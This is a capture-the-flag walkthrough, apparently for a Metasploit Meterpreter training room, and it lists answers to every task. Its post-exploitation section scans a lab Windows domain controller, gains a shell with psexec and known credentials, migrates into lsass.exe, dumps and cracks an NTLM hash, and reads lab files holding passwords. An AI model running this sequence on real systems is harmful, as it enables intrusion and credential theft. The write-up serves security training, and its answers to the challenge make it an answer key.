# Metasploit: Meterpreter 

> Evan Diamantidis | May 27th, 2022

--------------------------

<br />

# 1. Introduction to Meterpreter

1.1: No answer needed
```
No answer needed
```

<br />
<br />

# 2. Meterpreter Flavors
	
2.1: No answer needed.

```
No answer needed
```
<br />
<br />

# 3. Meterpreter Commands

3.1: No answer needed.
```
No answer needed
```

<br />
<br />

# 4. Post-Exploitation with Meterpreter

4.1: No answer needed.
```
No answer needed
```

<br />
<br />

# 5. Post-Exploitation Challenge


5.1: What is the computer name?

We will be using nmap to gather information on the target system.
```
nmap -sC -sV -oN nmap/initial 10.10.133.146
```
The output of the "initial" file we created under the "nmap" folder as follows:
```
# Nmap 7.92 scan initiated Fri May 27 08:51:05 2022 as: nmap -sC -sV -oN nmap/initial 10.10.133.146
Nmap scan report for 10.10.133.146
Host is up (0.013s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-05-27 07:51:17Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: FLASH.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: FLASH.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2022-05-27T07:51:58+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=ACME-TEST.FLASH.local
| Not valid before: 2022-05-26T07:48:57
|_Not valid after:  2022-11-25T07:48:57
| rdp-ntlm-info: 
|   Target_Name: FLASH
|   NetBIOS_Domain_Name: FLASH
|   NetBIOS_Computer_Name: ACME-TEST
|   DNS_Domain_Name: FLASH.local
|   DNS_Computer_Name: ACME-TEST.FLASH.local
|   Product_Version: 10.0.17763
|_  System_Time: 2022-05-27T07:51:18+00:00
Service Info: Host: ACME-TEST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-05-27T07:51:21
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 27 08:51:57 2022 -- 1 IP address (1 host up) scanned in 52.75 seconds
```
As instructed, we can use the "exploit/windows/smb/psexec" module from the msfconsole for an initial SMB attack.
```
msfconsole
use exploit/windows/smb/psexec
set LHOST LOCALIP
set RHOSTS TARGETIP
set SMBUser ballen
set SMBPass Password1
run
```
The shell should now be up and running. To check the system information we simply use the "sysinfo" command, also hinted at us on the question.

![image](https://user-images.githubusercontent.com/14150485/170658359-f6584741-597e-40f9-aaf8-057e9984c598.png)

The computer name is "ACME-TEST"
```
ACME-TEST
```

5.2: What is the target domain?

To get this information we need to push the current meterpreter shell to the background for a second so we can use the "post/windows/gather/enum_domain" module.
```
background
```
Alternatively, we can use:
```
Ctrl + Z
```
Now that the process is running in the background, we may proceed with the "enum_domain" module.
```
use post/windows/gather/enum_domain
```
The only setting we need for this one is "SESSION", the number of which we can find by using the "sessions" command.

![2022-05-27 09_08_50-Kali  Running  - Oracle VM VirtualBox](https://user-images.githubusercontent.com/14150485/170658890-a82b5d01-0b48-4320-9f0a-8ba7183507a3.png)

We set the session and run the exploit.
```
set SESSION 1
run
```
The output shows the domain name.

![image](https://user-images.githubusercontent.com/14150485/170659878-f4ebb96e-1c21-4bb7-8265-6fbd9b5440e6.png)
```
FLASH
```

5.3: What is the name of the share likely created by the user? 

As per the hint, module "post/windows/gather/enum_shares" will get us this information.
```
use post/windows/gather/enum_shares
```
Once again, the only setting we need before running the exploit is called "SESSION".
```
set SESSION 1
run
```
![image](https://user-images.githubusercontent.com/14150485/170660492-07368442-3ced-4838-bcdc-4455534c71e5.png)

Looks like there are 3 shares available, the one created by the user is likely in lowercase.
```
speedster
```

5.4: What is the NTLM hash of the jchambers user?

Resume the meterpreter session running in the background.
```
session -i 1
```
Per the hint on this task, we need to migrate the "lsass.exe" process. However, we first need to find its number.
```
ps aux | grep -iF 'lsass.exe'
```
![image](https://user-images.githubusercontent.com/14150485/170661464-72dd745e-30f4-4b96-a8b0-a056fb7dddaf.png)

Now that we know what the "PID" number is we can proceed to migrate it as instructed.
```
migrate PIDNUMBER
```
![image](https://user-images.githubusercontent.com/14150485/170661843-3dd1bd2e-4bf9-4073-af8a-d8507644aeb1.png)


Now for the hash dump.
```
hashdump
```
![image](https://user-images.githubusercontent.com/14150485/170661893-927a53b5-3c7c-4f38-abc1-c7e90bae2963.png)
```
69596c7aa1e8daee17f8e78870e25a5c
```

5.5: What is the cleartext password of the jchambers user?

A simple hash check on CrackStation should suffice.

![image](https://user-images.githubusercontent.com/14150485/170662318-b98261e7-b2b6-4d0a-9ee0-98537f7e5d68.png)

```
Trustno1
```

5.6: Where is the "secrets.txt"  file located?

```
search -f secrets.txt
```
The file is located in the "C:\Program Files (x86)\Windows Multimedia Platform\\" folder.

![image](https://user-images.githubusercontent.com/14150485/170663807-4eceae66-9e14-47f5-b626-484aa333e454.png)
```
C:\Program Files (x86)\Windows Multimedia Platform\
```

5.7: What is the Twitter password revealed in the "secrets.txt" file?
```
cat secrets.txt
```
![image](https://user-images.githubusercontent.com/14150485/170663999-7a5bdf43-0054-444b-82ad-d63e3a124e2c.png)

```
KDSvbsw3849!
```

5.8: Where is the "realsecret.txt" file located? 
```
search -f realsecret.txt
```

The "realsecret.txt" file is located under the "C:\inetpub\wwwroot\\" folder.

![image](https://user-images.githubusercontent.com/14150485/170664342-1fa9a5af-84bb-4a5f-9382-77f1cd16bb58.png)
```
C:\inetpub\wwwroot\
```

5.9: What is the real secret? 
```
cat realsecret.txt
```
![image](https://user-images.githubusercontent.com/14150485/170664691-578353ce-3433-4460-b251-aae0531a18f6.png)


Well, looks like "The Flash is the fastest man alive" - No secret there!
```
The Flash is the fastest man alive
```


